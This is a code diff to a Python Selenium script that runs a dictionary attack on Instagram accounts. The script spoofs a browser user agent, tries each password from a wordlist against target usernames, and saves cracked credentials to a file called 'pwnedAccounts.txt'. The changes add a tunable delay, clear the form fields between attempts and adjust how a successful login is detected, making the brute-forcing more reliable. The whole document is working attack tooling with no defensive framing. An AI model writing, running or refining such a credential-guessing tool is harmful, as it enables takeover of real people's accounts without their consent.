@@ -9,8 +9,8 @@ import optparse
 
 profile = webdriver.FirefoxProfile()
 profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
-driver = webdriver.Firefox(profile)
-driver.implicitly_wait(30)
+driver = "reserved"
+
 def userExists(username):
 	try:
 		driver.get("https://instagram.com/"+username)
@@ -21,15 +21,24 @@ def userExists(username):
 	except:
 		'uknown error'
 		
-def login(user, password):
+def login(user, password, delay):
 	try:
 		print 'Trying with password: ' + password
 		elem = driver.find_element_by_name("username")
+		elem.clear()
 		elem.send_keys(user)
 		elem = driver.find_element_by_name("password")
+		elem.clear()
 		elem.send_keys(password)  
 		elem.send_keys(Keys.RETURN)
-		assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
+		sleep(delay)
+		assert (("Login") in driver.title)
+		#assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
+		#if driver.current_url == 'https://www.instagram.com/':
+		#	print 'Password correct!'
+		#	print '%s' %password
+		#else:
+		#	print 'Wrong password'
 	except AssertionError:
 		print 'Access granted mother kaker!!' 
 		print 'The password is: ' + password
@@ -39,36 +48,48 @@ def login(user, password):
 			f = open('pwnedAccounts.txt','w')
 		f.write('username:'+user+'\npassword:'+password+'\n')
 		f.close()
+		driver.delete_all_cookies()
 		return 1
 	except:
 		print "\r Check your connection to the internet mother kaker\r"
 
-def dictionaryAttack(usernames,passwords):
+def dictionaryAttack(usernames,passwords,delay):
 	if str(type(usernames)) == "<type 'list'>":
 		for username in usernames:
 			if (userExists(username) == 1):
 				continue
 			driver.get("https://instagram.com/accounts/login/")
-			sleep(30)
+			sleep(delay * 7)
 			print 'Trying with username: ' + username
 			for password in passwords:
-				if (login(username,password) == 1):
+				if (login(username,password,delay) == 1):
 					cj.clear()
 					break
 	else:
 		if (userExists(usernames) == 1):
 			return
 		driver.get("https://instagram.com/accounts/login/")
+		sleep(delay * 7)
 		print 'Trying with username: ' + usernames
 		for password in passwords:
-			if (login(usernames,password) == 1):
+			if (login(usernames,password,delay) == 1):
 				break
 def main():
 	parser = optparse.OptionParser()
 	parser.add_option('-f', '--file', action="store", dest="userfile", help="File containing valid usernames (one per line)", default=False)
 	parser.add_option('-d', '--dictionary', action="store", dest="dictionary", help="File containing passwords", default=False)
 	parser.add_option('-u', '--username', action="store", dest="username", help="A valid username", default=False)
+	parser.add_option('-t', '--time', action="store", dest="delay", help="delay in seconds. Use this option based on your connection speed", default=True)
 	options, args = parser.parse_args()
+
+	global driver
+
+	if (options.delay is None):
+		delay = 2
+	else:
+		delay = int(options.delay)
+	print 'Using %d seconds of delay' %delay 
+
 	if ( (options.userfile == False) and (options.username == False) ) :
 		print 'You have to set an username or a userfile'
 		exit()
@@ -78,7 +99,7 @@ def main():
 	if (options.dictionary == False):
 		print 'You have to set a valid path for the passwords dictionary'
 		exit()
-	
+
 	try:
 		f = open(options.dictionary,'r')
 		passwords = []
@@ -106,10 +127,15 @@ def main():
 			f.close()
 		except:
 			print 'Check the path to the users file and try again'
-			exit()	
-		dictionaryAttack(usernames,passwords)
+			exit()
+        	
+        	driver = webdriver.Firefox(profile)
+        	driver.implicitly_wait(30)
+		dictionaryAttack(usernames,passwords,delay)
 	else:
-		dictionaryAttack(options.username,passwords)
+       		driver = webdriver.Firefox(profile)
+	        driver.implicitly_wait(30)
+		dictionaryAttack(options.username,passwords,delay)
 	
 	driver.close()
 if __name__ == '__main__':
